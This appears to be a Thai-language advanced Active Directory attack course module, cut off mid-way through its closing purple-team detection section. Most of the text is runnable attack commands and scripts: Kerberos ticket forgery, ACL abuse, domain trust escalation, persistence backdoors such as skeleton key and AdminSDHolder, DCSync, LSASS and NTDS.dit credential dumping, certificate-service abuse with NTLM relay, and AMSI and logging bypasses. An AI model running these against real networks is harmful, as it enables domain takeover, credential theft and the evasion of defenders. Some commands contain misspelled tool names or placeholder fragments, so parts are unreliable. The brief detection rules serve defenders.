# Part 73: Advanced Active Directory Attacks

> **ระดับ**: Professional to World-Class | **เวลาเรียน**: 12-16 ชั่วโมง

## สารบัญ
1. [AD Architecture Review](#1-ad-architecture-review)
2. [Kerberos Attack Techniques](#2-kerberos-attack-techniques)
3. [ACL/ACE Abuse](#3-aclace-abuse)
4. [Trust Attacks](#4-trust-attacks)
5. [Persistence Techniques](#5-persistence-techniques)
6. [Credential Attacks](#6-credential-attacks)
7. [BloodHound Advanced](#7-bloodhound-advanced)
8. [ADCS Attacks](#8-adcs-attacks)
9. [Defensive Evasion](#9-defensive-evasion)
10. [Purple Team Exercises](#10-purple-team-exercises)

---

## 1. AD Architecture Review

### Domain Trust Relationships

```
┌───────────────────────────────────────────────┐
│                FOREST: company.com                   │
│  ┌───────────────────────────────────────────┐  │
│  │      TREE: company.com (Root Domain)       │  │
│  │         dc01.company.com (PDC Emulator)    │  │
│  └──────────────┬──────────────┬──────────────┘  │
│              ↓              ↓               │
│  ┌──────────────┐  ┌──────────────┐   │
│  │ dev.company  │  │ prod.company  │   │
│  │     .com     │  │     .com      │   │
│  └──────────────┘  └──────────────┘   │
└───────────────────────────────────────────────┘
        ↕  External Trust
┌────────────────────┐
│  FOREST: partner.com │  (External Forest)
└────────────────────┘

Trust Types:
- Parent-Child: โดยอัตโนมัติ (transitive + two-way)
- Tree-Root: ระหว่าง trees (transitive + two-way)
- External: กับ domain ไม่อยู่ใน forest เดียวกัน (non-transitive)
- Forest: ระหว่าง forests (can be one-way or two-way)
- Shortcut: เร่ง authentication ระหว่าง domains
```

### AD Reconnaissance

```powershell
# === PowerView Reconnaissance ===
import-module PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainTrust
Get-ForestTrust
Get-ForestDomain

# สถิติ DC
Get-DomainController | Select-Object Name, IPAddress, OSVersion, Roles

# เริ่ม enumerate
Get-DomainUser | Select-Object samaccountname, description, pwdlastset, badpasswordcount
Get-DomainComputer | Select-Object name, operatingsystem, lastlogon
Get-DomainGroup | Select-Object samaccountname, description

# หา users ใน Domain Admins
Get-DomainGroupMember 'Domain Admins' -Recurse

# หา users ที่ Kerberoastable
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# หา users ที่ ASREProastable
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Local admins บนคอมพิวเตอร์ทั้งหมด
Get-DomainComputer | Get-NetLocalGroupMember
Find-LocalAdminAccess  # หา computers ที่ current user เป็น local admin

# หา sessions บน DCs
Get-NetSession -ComputerName dc01.company.com
Get-NetLoggedon -ComputerName dc01.company.com

# Share enumeration
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile
```

---

## 2. Kerberos Attack Techniques

### Kerberoasting

```python
#!/usr/bin/env python3
# kerberoasting.py - อธิบาย Kerberoasting

"""
Kerberoasting:
1. ขอ TGS (Service Ticket) สำหรับ service accounts (SPN)
2. TGS ถูกเข้ารหัสด้วย service account password
3. Crack TGS offline -> ได้ plaintext password

ต้องการ: Valid domain credentials (user ธรรมดาก็ได้)
"""

# Impacket implementation
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
import datetime
import re

# Python-based Kerberoasting (concept)
def explain_kerberoasting():
    return """
Kerberoasting Steps:
1. Get list of users with SPN (Service Principal Names):
   Get-DomainUser -SPN
   ldapsearch -H ldap://dc -b 'DC=company,DC=com' '(servicePrincipalName=*)' samAccountName servicePrincipalName

2. Request TGS for each SPN:
   - Impacket: GetUserSPNs.py
   - PowerView: Invoke-Kerberoast
   - Rubeus: kerberoast

3. Extract hash from TGS
4. Crack with hashcat/john

Output format: $krb5tgs$23$*user$DOMAIN$SPN*$hash
"""
```

```bash
# === Kerberoasting Commands ===

# Impacket - เข้าถึงจาก Linux
GetUserSPNs.py company.com/user:password -dc-ip 192.168.1.10

# บันทึกแล้ว crack
GetUserSPNs.py company.com/user:password -dc-ip 192.168.1.10 \
  -outputfile /tmp/kerberoast-hashes.txt

# Crack ด้วย hashcat
hashcat -m 13100 /tmp/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /tmp/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt /domain:company.com

# Rubeus - เฉพาะ RC4 (easier to crack)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# PowerView
Invoke-Kerberoast | Select-Object SamAccountName, @{Name='Hash';Expression={$_.Hash}} | Format-List

# จาก hash ที่ได้:
# $krb5tgs$23$*sqlsvc$COMPANY.COM$MSSQLSvc/sql01.company.com*$1a2b3c...hash...
```

### AS-REP Roasting

```bash
# AS-REP Roasting - users ที่ disable Kerberos pre-auth

# ต้องการ: ไม่ต้องมี credentials!
GetNPUsers.py company.com/ -usersfile /tmp/users.txt -no-pass -dc-ip 192.168.1.10

# ถ้ามี credentials:
GetNPUsers.py company.com/user:password -dc-ip 192.168.1.10

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt

# Crack
hashcat -m 18200 asrep-hashes.txt rockyou.txt

# PowerView - หา users ที่ ASREProastable
Get-DomainUser -PreauthNotRequired
```

### Pass-the-Ticket

```bash
# === Pass-the-Ticket ===

# Dump tickets จาก memory
# Mimikatz:
sekurlsa::tickets /export

# Rubeus:
Rubeus.exe dump
Rubeus.exe dump /luid:0x4ae2 /nowrap

# Import ticket (Linux - Impacket)
export KRB5CCNAME=/tmp/stolen.ccache

# หรือ convert จาก kirbi format
ticketer.py -nthash <hash> -domain-sid <SID> -domain company.com user
export KRB5CCNAME=user.ccache

# ใช้ ticket แทน credentials
psexec.py -k -no-pass company.com/administrator@dc01.company.com
smbclient.py -k -no-pass //dc01.company.com/C$ -k

# Rubeus - Pass the Ticket
Rubeus.exe ptt /ticket:base64_ticket_here
Rubeus.exe ptt /ticket:ticket.kirbi

# ตรวจสอบ tickets
klist
Rubeus.exe klist
```

### Silver Ticket Attack

```bash
# Silver Ticket: ปลอม TGS สำหรับ service โดยไม่ต้องผ่าน KDC
# ต้องการ: service account hash + domain SID

# Mimikatz:
kerberos::golden \
  /user:Administrator \
  /domain:company.com \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /target:server01.company.com \
  /service:cifs \
  /rc4:service_account_ntlm_hash \
  /ptt  # inject ทันที

# Silver ticket ใช้ได้กับ services:
# cifs - SMB file share
# host - WMI, psexec
# http - web, WinRM
# ldap - AD queries
# mssql - SQL Server

# Impacket ticketer.py
ticketeer.py \
  -nthash <service_account_ntlm> \
  -domain-sid S-1-5-21-xxx \
  -domain company.com \
  -spn cifs/server01.company.com \
  administrator

export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass //server01.company.com/C$
```

### Golden Ticket Attack

```bash
# Golden Ticket: ปลอม TGT สำหรับ user ใดก็ได้
# ต้องการ: KRBTGT account hash (จาก DCSync)

# Step 1: DCSync - dump KRBTGT hash
secretsdump.py company.com/Administrator:'Password!'@dc01.company.com
# หรือ Mimikatz:
lsadump::dcsync /domain:company.com /user:krbtgt
# ผลลัพธ์:
# NTLM: 12345678901234567890123456789012

# Step 2: Get domain SID
Get-DomainSID  # PowerView
lookupsid.py company.com/user:password@dc01 company.com/krbtgt

# Step 3: สร้าง Golden Ticket
# Mimikatz:
kerberos::golden \
  /user:Administrator \
  /domain:company.com \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:12345678901234567890123456789012 \
  /groups:512,513,518,519,520 \
  /ptt

# Impacket:
ticketeer.py \
  -nthash <krbtgt_ntlm_hash> \
  -domain-sid S-1-5-21-xxx \
  -domain company.com \
  administrator

# ใช้ ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass administrator@dc01.company.com

# สำคัญ: Golden Ticket อยู่ได้ 10 ปีโดย default!
# วิธีลบ: Reset krbtgt password 2 ครั้ง (ทำลาย all tickets)
```

### Diamond Ticket

```bash
# Diamond Ticket: แก้ไข legitimate TGT แทนการสร้างใหม่
# ตรวจจับยากกว่า Golden Ticket

# Rubeus Diamond Ticket
Rubeus.exe diamond \
  /tgtdeleg \
  /ticketuser:administrator \
  /ticketuserid:500 \
  /groups:512 \
  /krbkey:<krbtgt_aes256_key> \
  /nowrap

# ข้อดีเหนือ Golden Ticket:
# - ใช้ legitimate PAC structure
# - Anomaly detection จับได้ยากกว่า
# - ตอบสนองต่อ ticket validation ได้
```

---

## 3. ACL/ACE Abuse

### ACL Enumeration

```powershell
# ค้นหา ACL misconfigurations ด้วย BloodHound/PowerView

# หา objects ที่ current user มีสิทธิ์แก้ไข
Get-DomainObjectAcl -ResolveGUIDs | 
  Where-Object { $_.SecurityIdentifier -match (Get-DomainSID).Value } |
  Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# หา ACEs ที่น่าสนใจสำหรับ user ของเรา
Find-InterestingDomainAcl -ResolveGUIDs | 
  Where-Object { $_.IdentityReferenceName -match 'our-username' }

# ดู ACL ของ specific object
Get-DomainObjectAcl 'CN=Domain Admins,CN=Users,DC=company,DC=com' -ResolveGUIDs
```

### ACL Abuse Techniques

```python
#!/usr/bin/env python3
# acl_abuse_reference.py - ACL abuse techniques reference

ACL_ABUSE_TECHNIQUES = {
    'GenericAll': {
        'description': 'Complete control over object',
        'targets': {
            'User': [
                'Reset password: Set-DomainUserPassword',
                'Add to group: Add-DomainGroupMember',
                'Targeted Kerberoast: Set SPN then Kerberoast',
                'Shadow credentials: Add KeyCredential',
            ],
            'Group': [
                'Add member: Add-DomainGroupMember -Identity "Domain Admins" -Members our-user',
            ],
            'Computer': [
                'RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity',
                'Shadow credentials: Add KeyCredential',
            ],
            'GPO': [
                'Add immediate task via GPO',
                'Set startup script',
            ]
        }
    },
    'GenericWrite': {
        'description': 'Write to most object attributes',
        'targets': {
            'User': [
                'Targeted Kerberoast: Set servicePrincipalName',
                'Logon script: Set scriptPath',
            ],
            'Computer': [
                'RBCD attack',
            ],
            'Group': [
                'Add member',
            ]
        }
    },
    'WriteOwner': {
        'description': 'Change object owner',
        'technique': 'Set-DomainObjectOwner then grant GenericAll'
    },
    'WriteDACL': {
        'description': 'Modify DACL (permissions)',
        'technique': 'Add-DomainObjectAcl to grant ourselves GenericAll'
    },
    'ForceChangePassword': {
        'description': 'Change user password without knowing current',
        'technique': 'Set-DomainUserPassword -Identity victim -AccountPassword'
    },
    'AddMember': {
        'description': 'Add members to group',
        'technique': 'Add-DomainGroupMember -Identity "Domain Admins" -Members our-user'
    },
    'Owns': {
        'description': 'Object owner = full control',
        'technique': 'Owner has implicit GenericAll'
    },
    'AllExtendedRights': {
        'description': 'Extended rights including User-Force-Change-Password',
        'technique': 'Reset password directly'
    },
    'DCSync': {
        'description': 'Replicating AD (GetChanges + GetChangesAll on domain)',
        'technique': 'secretsdump.py, Mimikatz lsadump::dcsync'
    }
}

for right, info in ACL_ABUSE_TECHNIQUES.items():
    print(f"\n[{right}]")
    print(f"  Description: {info['description']}")
    if isinstance(info.get('technique'), str):
        print(f"  Technique: {info['technique']}")
    elif 'targets' in info:
        for target, techniques in info['targets'].items():
            print(f"  On {target}:")
            for t in techniques:
                print(f"    - {t}")
```

### Targeted Kerberoasting via GenericWrite

```powershell
# Step 1: ตั้ง SPN บน target user
Set-DomainObject -Identity target-user \
  -Set @{serviceprincipalname='fake/spn'}

# Step 2: Kerberoast
Get-DomainUser target-user | Get-DomainSPNTicket -Format Hashcat

# Step 3: ลบ SPN หลังใช้งาน
Set-DomainObject -Identity target-user \
  -Clear serviceprincipalname
```

### Shadow Credentials (GenericWrite on Computer)

```bash
# Shadow Credentials Attack
# ต้องการ: GenericWrite บน computer object
# ผลลัพธ์: certificate สำหรับ authenticate เป็น computer account

# Whisker tool
Whisker.exe add /target:dc01$ /domain:company.com /dc:dc01.company.com
# Output: Rubeus command พร้อม certificate

# Certipy (Python)
certipy shadow auto -u user@company.com -p Password \
  -account dc01$ -dc-ip 192.168.1.10

# ใช้ certificate ที่ได้เพื่อขอ TGT
certipy auth -pfx dc01.pfx -domain company.com -dc-ip 192.168.1.10

# ผลลัพธ์: NTLM hash ของ computer account -> DCSync!
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# RBCD Attack
# ต้องการ: GenericWrite บน computer + computer account (ที่สร้างเองได้)

# Step 1: สร้าง fake computer account
AddComputer.py -computer-name 'ATTACK$' -computer-pass 'Password123!' \
  company.com/user:password

# Step 2: ตั้ง msDS-AllowedToActOnBehalfOfOtherIdentity
powermad/PowerView:
Set-DomainObject -Identity target-computer \
  -Set @{'msds-allowedtoactonbehalfofotheridentity'= # binary encoding of ATTACK$ SID}

# หรือ Impacket:
rbcd.py -delegate-from 'ATTACK$' -delegate-to 'target$' \
  -action write company.com/user:password -dc-ip 192.168.1.10

# Step 3: Request S4U2self/S4U2proxy
getST.py company.com/'ATTACK$':Password123! \
  -spn cifs/target.company.com \
  -impersonate Administrator \
  -dc-ip 192.168.1.10

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass Administrator@target.company.com
```

---

## 4. Trust Attacks

### Child-to-Parent Domain Escalation

```bash
# Extra SID Attack - จาก child domain -> parent domain
# ต้องการ: Domain Admin ใน child domain

# Step 1: DCSync KRBTGT hash ของ child domain
secretsdump.py child.company.com/Administrator:'Password!'@dc-child.child.company.com

# Step 2: หา Enterprise Admins SID (S-1-5-21-ROOT-519)
Get-DomainSID -Domain company.com  # parent domain SID

# Step 3: สร้าง Golden Ticket พร้อม Extra SID = Enterprise Admins
# Mimikatz:
kerberos::golden \
  /user:Administrator \
  /domain:child.company.com \
  /sid:S-1-5-21-CHILD-SID \
  /krbtgt:<child_krbtgt_hash> \
  /sids:S-1-5-21-ROOT-SID-519 \
  /ptt

# ตอนนี้ได้ access บน parent domain!
dir \\dc.company.com\C$

# Impacket:
raiseChild.py child.company.com/Administrator:Password company.com
# หรือ manual:
ticketeer.py \
  -nthash <child_krbtgt> \
  -domain-sid <child_sid> \
  -extra-sid <parent_EA_sid> \
  -domain child.company.com \
  Administrator
```

### Forest Trust Attack

```bash
# Forest Trust Ticket Attack
# ต้องการ: Trust Account Key

# หา Trust Keys
lsadump::trust /patch  # Mimikatz ใน DC

# สร้าง inter-realm TGT
kerberos::golden \
  /user:Administrator \
  /domain:source.com \
  /sid:S-1-5-21-SOURCE-SID \
  /krbtgt:<source_krbtgt> \
  /sids:S-1-5-21-TARGET-519 \
  /rc4:<trust_key> \
  /service:krbtgt \
  /target:target.com \
  /ptt
```

---

## 5. Persistence Techniques

### AdminSDHolder

```powershell
# AdminSDHolder Backdoor
# ใส่ ACE ใน AdminSDHolder template
# SDProp จะ copy ACE ไปให้ protected objects ทุก 60 นาที

# เพิ่ม GenericAll ให้ our user บน AdminSDHolder
Add-DomainObjectAcl \
  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=company,DC=com' \
  -PrincipalIdentity our-user \
  -Rights All

# รอ 60 นาที หรือ force propagation:
Invoke-SDPropagation
# หรือ PowerShell:
$objectPath = 'LDAP://CN=AdminSDHolder,CN=System,DC=company,DC=com'
$obj = New-Object System.DirectoryServices.DirectoryEntry $objectPath
$acl = $obj.ObjectSecurity
# ...
```

### DSRM Backdoor

```powershell
# DSRM (Directory Services Restore Mode) password backdoor
# ตั้ง DSRM password เป็น same as local admin

# Mimikatz - dump DSRM password
lsadump::sam

# เปลี่ยน DSRM login behavior ให้ใช้ได้บน network
Set-ItemProperty \
  'HKLM:\System\CurrentControlSet\Control\Lsa' \
  -Name 'DsrmAdminLogonBehavior' \
  -Value 2

# Login ด้วย DSRM:
New-PSSession -ComputerName dc01 \
  -Credential (Get-Credential dc01\Administrator)
```

### Golden SAML

```python
#!/usr/bin/env python3
# golden_saml.py - Golden SAML attack concept

"""
Golden SAML Attack:
- คล้าย Golden Ticket แต่สำหรับ SAML (ADFS)
- ต้องการ: ADFS token signing certificate
- ผลลัพธ์: authenticate เป็น user ใดก็ได้ใน federated services

Tools:
- AADInternals
- shimit
- ADFSDump
"""

import subprocess
import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
import uuid

def explain_golden_saml():
    return """
Golden SAML Steps:
1. Dump ADFS token signing certificate (ADFS DKM):
   - ADFSToolkit
   - SharpSCCM
   - Mimikatz on ADFS server

2. Create forged SAML token:
   - Subject: target@company.com
   - Sign with stolen certificate

3. Use token to access:
   - Office 365
   - Azure AD
   - Any SAML-federated service

Critical: Cannot be detected via password reset!
Only fix: Revoke/regenerate ADFS token signing certificate
"""

print(explain_golden_saml())
```

### Skeleton Key

```powershell
# Skeleton Key - inject master password ใน DC memory
# ไม่ persistent! (รีบูต DC = หาย)

# Mimikatz:
misc::skeleton

# ตอนนี้ master password 'mimikatz' ใช้ได้กับทุก account!
net use \\dc01\C$ /user:Administrator mimikatz

# ป้องกัน: Protected Users group, Credential Guard
```

---

## 6. Credential Attacks

### DCSync

```bash
# DCSync - ดึง NTLM hashes ของทุก account
# ต้องการ: Replicating Directory Changes permissions

# Secretsdump
secretsdump.py company.com/Administrator:'Password!'@dc01.company.com

# เฉพาะ NTDS
secretsdump.py company.com/Administrator:'Password!'@dc01.company.com \
  -just-dc-ntlm

# ดึง krbtgt
secretsdump.py company.com/Administrator:'Password!'@dc01.company.com \
  -just-dc-user krbtgt

# Mimikatz:
lsadump::dcsync /domain:company.com /all /csv
lsadump::dcsync /domain:company.com /user:krbtgt
lsadump::dcsync /domain:company.com /user:Administrator

# ผลลัพธ์:
# company.com\Administrator:500:aad3b435...:8846f7eaee8fb117ad06...::: 
# NTLM = 8846f7eaee8fb117ad06bdd830b7586c

# Pass the Hash ด้วย NTLM:
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@target
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@target
```

### LSASS Credential Dumping

```python
#!/usr/bin/env python3
# lsass_dump_techniques.py - LSASS dumping techniques

LSASS_TECHNIQUES = [
    {
        'name': 'Mimikatz sekurlsa',
        'command': 'sekurlsa::logonpasswords',
        'detection': 'HIGH - very noisy, well-detected'
    },
    {
        'name': 'ProcDump',
        'command': 'procdump.exe -ma lsass.exe /tmp/lsass.dmp',
        'command2': 'sekurlsa::minidump lsass.dmp && sekurlsa::logonpasswords',
        'detection': 'MEDIUM - dump file on disk'
    },
    {
        'name': 'Task Manager',
        'description': 'Right-click lsass.exe -> Create dump file',
        'detection': 'MEDIUM'
    },
    {
        'name': 'Comsvcs.dll MiniDump',
        'command': 'rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id lsass.dmp full',
        'detection': 'MEDIUM - rundll32 used'
    },
    {
        'name': 'NanoDump',
        'url': 'https://github.com/helpsystems/nanodump',
        'description': 'Stealth LSASS dump using low-level API',
        'detection': 'LOW - bypasses many AV'
    },
    {
        'name': 'SilentProcessExit',
        'description': 'Trigger Windows Error Reporting to dump LSASS',
        'detection': 'LOW'
    },
    {
        'name': 'PypyKatz (offline)',
        'command': 'pypykatz lsa minidump lsass.dmp',
        'detection': 'None - offline analysis'
    },
    {
        'name': 'Dumpert (kernel)',
        'description': 'Kernel driver to dump LSASS bypassing usermode hooks',
        'detection': 'LOW'
    }
]

for t in LSASS_TECHNIQUES:
    print(f"\n[{t['name']}]")
    if 'command' in t:
        print(f"  Command: {t['command']}")
    if 'description' in t:
        print(f"  Description: {t['description']}")
    print(f"  Detection: {t.get('detection', 'Unknown')}")
```

### NTDS.dit Extraction

```bash
# NTDS.dit - database ของ AD (contains all password hashes)

# Method 1: Volume Shadow Copy
vssadmin create shadow /for=C:
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Method 2: ntdsutil snapshot
ntdsutil
"ac in ntds"
"ifm"
"create full C:\\ntds-ifm"
"quit"
"quit"

# Method 3: Impacket (remote)
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Method 4: DSInternals (PowerShell)
Install-Module DSInternals
Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DBPath .\ntds.dit -BootKey <bootkey> -All | Format-Custom -View HashcatNT

# หลังจากได้ hashes:
hashcat -m 1000 ntds-hashes.txt rockyou.txt
hashcat -m 1000 ntds-hashes.txt rockyou.txt -r best64.rule
```

---

## 7. BloodHound Advanced

### Custom BloodHound Queries

```cypher
// === BloodHound Cypher Queries ===

// หา shortest path ไปยัง Domain Admins
MATCH p=shortestPath(
  (n:User {name: 'USER@COMPANY.COM'})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@COMPANY.COM'})
)
RETURN p

// หา users ที่มีทาง Domain Admin ผ่าน hops น้อยที่สุด
MATCH (u:User),(g:Group {name:'DOMAIN ADMINS@COMPANY.COM'})
WITH u,g
MATCH p=shortestPath((u)-[*1..10]->(g))
RETURN u.name, length(p) AS hops
ORDER BY hops
LIMIT 20

// หา computers ที่มี unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name, c.operatingsystem

// หา service accounts ที่ Kerberoastable
MATCH (u:User {hasspn:true})
WHERE u.enabled = true
RETURN u.name, u.serviceprincipalnames, u.pwdlastset

// หา computers ที่ Domain Admins มี session อยู่
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer)
RETURN u.name, c.name

// หา users ที่มี DCSync rights
MATCH p=(n)-[r:DCSync|AllExtendedRights|GenericAll]->(d:Domain)
RETURN p

// หา paths จาก Kerberoastable users ไปยัง DA
MATCH (u:User {hasspn:true}),(g:Group {name:'DOMAIN ADMINS@COMPANY.COM'})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p ORDER BY length(p) LIMIT 10

// หา users ที่มีสิทธิ์ WriteOwner บน Domain Admins
MATCH p=(u:User)-[:WriteOwner]->(g:Group {name:'DOMAIN ADMINS@COMPANY.COM'})
RETURN p

// ACL paths ทั้งหมดไปยัง DA
MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword|Owns|AddMember|AddSelf]->(n)
WHERE n.name CONTAINS 'DOMAIN ADMINS'
RETURN p LIMIT 20
```

### SharpHound Collection

```powershell
# SharpHound - AD collection

# Basic collection
.\SharpHound.exe -c All

# Stealth collection (slower)
.\SharpHound.exe -c All --stealth

# ระบุ domain controller
.\SharpHound.exe -c All --domaincontroller 192.168.1.10

# Collection อื่นๆ
.\SharpHound.exe -c DCOnly  # เฉพาะ DC data (เร็วมาก)
.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts

# BloodHound Python (จาก Linux)
bloodhound-python -u user -p password \
  -ns 192.168.1.10 \
  -d company.com \
  -c All

# import ใน BloodHound
# Drag and drop zip file ใน BloodHound GUI
```

---

## 8. ADCS Attacks

### ESC1 - Template Misconfiguration

```bash
# Active Directory Certificate Services (ADCS) Attacks
# Ref: https://posts.specterops.io/certified-pre-owned-d95910965cd2

# Enumerate ADCS với Certipy
certipy find -u user@company.com -p 'Password!' -dc-ip 192.168.1.10
certipy find -u user@company.com -p 'Password!' -dc-ip 192.168.1.10 -vulnerable

# === ESC1: Template allows SAN + Enrollment ===
# Certificate template อนุญาต ให้กำหนด Subject Alternative Name

# Request certificate เป็น Administrator
certipy req -u user@company.com -p 'Password!' \
  -ca company-DC01-CA \
  -template 'VulnerableTemplate' \
  -upn Administrator@company.com \
  -dc-ip 192.168.1.10

# Authenticate ด้วย certificate
certipy auth -pfx administrator.pfx -domain company.com -dc-ip 192.168.1.10
# ได้ NTLM hash ของ Administrator!

# === ESC2: Any Purpose EKU ===
certipy req -u user@company.com -p 'Password!' \
  -ca company-DC01-CA \
  -template 'ESC2Template' \
  -dc-ip 192.168.1.10

# === ESC3: Enrollment Agent ===
# ขอ certificate เป็น Enrollment Agent แล้วใช้ request certificate เป็น user อื่น
certipy req -u user@company.com -p 'Password!' \
  -ca company-DC01-CA \
  -template 'EnrollmentAgentTemplate' \
  -dc-ip 192.168.1.10

certipy req -u user@company.com -p 'Password!' \
  -ca company-DC01-CA \
  -template 'User' \
  -on-behalf-of 'company\Administrator' \
  -pfx ea.pfx \
  -dc-ip 192.168.1.10
```

### ESC4, ESC6, ESC8

```bash
# === ESC4: Vulnerable Certificate Template ACL ===
# User มี GenericWrite บน template -> แก้ไข template ให้ vulnerable

certipy template -u user@company.com -p 'Password!' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 192.168.1.10
# แก้ไข template ให้ SAN สามารถระบุได้
# Request certificate เป็น Administrator
# Restore template

# === ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag ===
# CA flag ที่อนุญาต SAN ในทุก templates

certipy req -u user@company.com -p 'Password!' \
  -ca company-DC01-CA \
  -template 'User' \
  -upn administrator@company.com \
  -dc-ip 192.168.1.10

# === ESC8: NTLM Relay to AD CS HTTP Endpoints ===
# Relay NTLM authentication ไปยัง CA web enrollment

# Setup relay
ntlmrelayx.py -t 'http://ca.company.com/certsrv/certfnsh.asp' \
  --adcs \
  --template 'DomainController'

# Trigger authentication (PetitPotam)
petitpotam.py -d company.com -u '' -p '' <attacker_ip> <dc_ip>

# ได้ base64 certificate
certipy auth -pfx dc01.pfx -domain company.com -dc-ip 192.168.1.10
```

---

## 9. Defensive Evasion

### Bypass AMSI

```powershell
# AMSI Bypass techniques

# Method 1: Memory patching
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Base64 obfuscation
$a = 'System.Management.Automation.A' + 'msiUtils'
$b = [Ref].Assembly.GetType($a).GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Method 3: ใช้ Matt Graeber's bypass (obfuscated)
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsi"+"InitFailed","NonPublic,Static").GetValue($null).GetType().GetField("m_"+"value","NonPublic,Instance").GetValue([Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsi"+"InitFailed","NonPublic,Static").GetValue($null)), 1)

# Method 4: ETW bypass
[Reflection.Assembly]::LoadWithPartialName('Microsoft.Win32.TaskScheduler') | Out-Null
```

### PowerShell Logging Bypass

```powershell
# ปิด ScriptBlock Logging
$r = [Ref].Assembly.GetType('System.Management.Automation.Utils')
$f = $r.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$v = $f.GetValue($null)
if ($v['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']) {
  $v['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
} else {
  $v['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
  $v['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'].Add('EnableScriptBlockLogging', 0)
}

# Constrained Language Mode check
$ExecutionContext.SessionState.LanguageMode
# ถ้า FullLanguage = ปกติ
# ถ้า ConstrainedLanguage = ถูก restrict

# Bypass CLM ด้วย PowerShell downgrade
powershell -version 2 -exec bypass
# PowerShell 2.0 ไม่มี ScriptBlock logging

# Invoke-Obfuscation
Import-Module Invoke-Obfuscation
Invoke-Obfuscation
SET SCRIPTPATH C:\payload.ps1
OBFUSCATE
AST
1,2,3,4
```

---

## 10. Purple Team Exercises

### Detection Lab

```python
#!/usr/bin/env python3
# purple_team_lab.py - สร้าง Purple Team scenarios

PURPLE_TEAM_SCENARIOS = [
    {
        'attack': 'Kerberoasting',
        'mitre_id': 'T1558.003',
        'detection_rule': '''
EventCode=4769
Ticket_Encryption_Type=0x17  # RC4
Service_Name NOT IN ("krbtgt", "host", "cifs")
        ''',
        'splunk_query': '''
index=wineventlog EventCode=4769 
Ticket_Encryption_Type=0x17 
Service_Name!="krbtgt" Service_Name!="$"
| stats count by Account_Name, Service_Name, Client_Address
| sort -count
        ''',
        'false_positive': 'Service accounts using RC4',
        'response': 'Review flagged SPNs, reset service account passwords'
    },
    {
        'attack': 'Pass-the-Hash',
        'mitre_id': 'T1550.002',
        'detection_rule': '''
EventCode=4624
Logon_Type=3
Logon_Process=NtLmSsp
NTLM only (not Kerberos)
        ''',
        'splunk_query': '''
index=wineventlog EventCode=4624 
Logon_Type=3 
Authentication_Package=NTLM
| stats count by Account_Name, Workstation_Name, Source_Network_Address
| where count > 10
        ''',
        'response': 'Block NTLM where possible, enable Protected Users'
    },
    {
        'attack': 'DCSync',
        'mitre_id': 'T1003.006',
        'detection_rule': '''
EventCode=4662
Object_Type: %{19195a5b-6da0-11d0-afd3-00c04fd930c9}  # Domain
Access_Mask: 0x100  # Replicating Directory Changes All
AND NOT DC computer accounts
        ''',
        'splunk_query': '''
index=wineventlog EventCode=4662 
ObjectType="%{19195a5b-6da0-11d0-afd3-00c04fd930c9}" 
Access_Mask="0x100"
| where NOT match(Subject_Account_Name, "\$")
| table _time, Subject_Account_Name, Subject_Account_Domain, Client_Address
        ''',
        'response': 'Immediate isolation, credential reset'
    },
    {
        'attack': 'Golden Ticket',
        'mitre_id': 'T1558.001',
        'detection_rule': '''
EventCode=4769
Ticket lifetime > 10 hours (unusual)
OR Ticket with forged PAC
OR Account not in AD
        ''',
        'splunk_query': '''
